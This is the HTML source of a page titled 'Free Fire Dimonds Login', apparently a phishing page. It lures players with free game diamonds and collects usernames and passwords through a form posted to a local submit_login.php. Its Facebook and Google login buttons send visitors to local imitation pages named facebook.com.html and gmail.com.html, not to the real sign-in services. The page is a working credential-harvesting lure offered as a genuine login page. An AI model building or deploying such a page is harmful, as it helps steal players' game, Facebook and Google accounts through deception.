<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Dimonds Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url('wp3144284.webp'); /* Set background image */
            background-size: cover; /* Ensure the background covers the entire page */
            background-position: center; /* Center the background image */
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent background */
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
            width: 300px;
            text-align: center;
            max-width: 100%;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #f39c12;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #444;
            color: #fff;
            font-size: 16px;
        }
        input[type="submit"] {
            background-color: #f39c12;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #e67e22;
        }
        .footer {
            margin-top: 10px;
            font-size: 14px;
            color: #aaa;
        }
        a {
            text-decoration: none;
        }
        .social-btn {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            color: #fff;
            cursor: pointer;
        }
        .facebook-btn {
            background-color: #3b5998;
        }
        .google-btn {
            background-color: #db4437;
        }
        .social-btn:hover {
            opacity: 0.8;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h1>Free Fire Dimonds</h1>
        <form action="submit_login.php" method="POST">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" placeholder="Enter your username" required>
            
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>
            
            <input type="submit" value="Login" aria-label="Login">
        </form>
        
        <p>OR</p>
        
        <!-- Facebook Login Button -->
        <button class="social-btn facebook-btn" onclick="window.location.href='facebook.com.html'">
            Login with Facebook
        </button>
        
        <!-- Google Login Button -->
        <button class="social-btn google-btn" onclick="window.location.href='gmail.com.html'">
            Login with Google
        </button>

        <div class="footer">
            <p>Don't have an account? <a href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://accounts.google.com/b/0/AddMailService&ddm=1&dsh=S990509860:1741005051270763&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://accounts.google.com/b/0/AddMailService&ifkv=ASSHykoZ6p4b8R88DLnLynAdlvgCvs09CmXjsds1XV8kxGvPUBrTQg70NHFBDza-WnxpWWTzLvUm4g&TL=ADgdZ7RITgtsEGYNFG6GO3RbRGwzgUM82cK9deDBiJ65iwECI51qVSELLb9gvSPg" style="color: #f39c12;">Sign up</a></p>
        </div>
    </div>

</body>
</html>
